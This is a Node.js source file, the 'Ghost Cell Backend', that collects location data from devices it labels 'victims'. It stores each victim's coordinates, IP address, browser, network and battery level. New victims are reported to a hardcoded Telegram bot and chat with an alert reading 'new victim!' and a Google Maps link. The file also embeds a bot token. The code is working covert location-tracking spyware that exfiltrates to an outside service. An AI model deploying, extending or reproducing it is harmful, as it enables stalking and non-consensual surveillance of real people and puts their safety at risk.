const express = require('express');
const cors = require('cors');
const { WebSocketServer } = require('ws');
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json({ limit: '100kb' }));

const BOT_TOKEN = process.env.TELEGRAM_TOKEN || '8958912849:AAE4LQG6QlA3qGQccfIbI8ghZDMgWida-yg';
const CHAT_ID = process.env.TELEGRAM_CHAT || '972326806';
const PORT = process.env.PORT || 3000;

const victims = new Map();
const notified = new Set();

function sendTelegram(text) {
  const data = JSON.stringify({
    chat_id: CHAT_ID,
    text: text,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  });
  const opts = {
    hostname: 'api.telegram.org',
    path: '/bot' + BOT_TOKEN + '/sendMessage',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
  };
  const req = https.request(opts, () => {});
  req.on('error', () => {});
  req.write(data);
  req.end();
}

function sendTelegramLocation(lat, lng, acc, id) {
  const gmaps = 'https://www.google.com/maps?q=' + lat + ',' + lng;
  const msg = '<b>' + decodeURIComponent(id) + '</b>\n'
    + '📍 <a href="' + gmaps + '">' + lat + ', ' + lng + '</a>\n'
    + '🎯 ±' + acc + 'm\n'
    + '🕐 ' + new Date().toLocaleString('ar-SA');

  const data = JSON.stringify({
    chat_id: CHAT_ID,
    text: msg,
    parse_mode: 'HTML',
    reply_markup: JSON.stringify({
      inline_keyboard: [[{
        text: '🗺️ فتح الخريطة',
        url: gmaps
      }]]
    })
  });
  const opts = {
    hostname: 'api.telegram.org',
    path: '/bot' + BOT_TOKEN + '/sendMessage',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
  };
  const req = https.request(opts, () => {});
  req.on('error', () => {});
  req.write(data);
  req.end();
}

app.post('/track', (req, res) => {
  const d = req.body;
  if (!d || !d.id) return res.status(400).json({ error: 'bad' });

  d.ip = req.ip;
  d.time = Date.now();

  if (!victims.has(d.id)) victims.set(d.id, []);
  victims.get(d.id).push(d);

  console.log('[+] ' + d.id + ' | ' + d.lat + ',' + d.lng + ' | ±' + d.acc + 'm');

  if (!notified.has(d.id) && d.lat && d.lng) {
    notified.add(d.id);
    sendTelegramLocation(d.lat, d.lng, d.acc || '?', d.id);

    sendTelegram(
      '<b>🆕 ضحية جديدة!</b>\n'
      + '🆔 ' + d.id + '\n'
      + '📱 ' + (d.ua || '?').slice(0, 50) + '\n'
      + '🌐 ' + (d.net || '?') + '\n'
      + '🔋 ' + (d.batt !== undefined ? (d.batt * 100).toFixed(0) + '%' : '?')
    );
  }

  res.json({ ok: true });
});

app.get('/victims', (req, res) => {
  const out = [];
  for (const [id, pts] of victims) {
    if (pts.length > 0) {
      const l = pts[pts.length - 1];
      out.push({ id, lat: l.lat, lng: l.lng, acc: l.acc, time: l.time, ip: l.ip, count: pts.length });
    }
  }
  res.json(out);
});

app.get('/history', (req, res) => {
  res.json(victims.get(req.query.id) || []);
});

app.get('/health', (req, res) => {
  res.json({ ok: true, victims: victims.size, uptime: process.uptime() });
});

const server = http.createServer(app);

const wss = new WebSocketServer({ server });
wss.on('connection', (ws) => {
  ws.on('message', (raw) => {
    try {
      const d = JSON.parse(raw.toString());
      d.ip = ws._socket.remoteAddress;
      d.time = Date.now();
      if (!victims.has(d.id)) victims.set(d.id, []);
      victims.get(d.id).push(d);
      if (!notified.has(d.id) && d.lat) {
        notified.add(d.id);
        sendTelegramLocation(d.lat, d.lng, d.acc || '?', d.id);
      }
      wss.clients.forEach(c => { if (c.readyState === 1) c.send(JSON.stringify({ type: 'update', data: d })); });
    } catch(e) {}
  });
});

server.listen(PORT, () => {
  console.log('[*] Ghost Cell Backend running on port ' + PORT);
  console.log('[*] Telegram bot connected: @' + BOT_TOKEN.slice(0, 10) + '...');
  console.log('[*] Chat ID: ' + CHAT_ID);
});
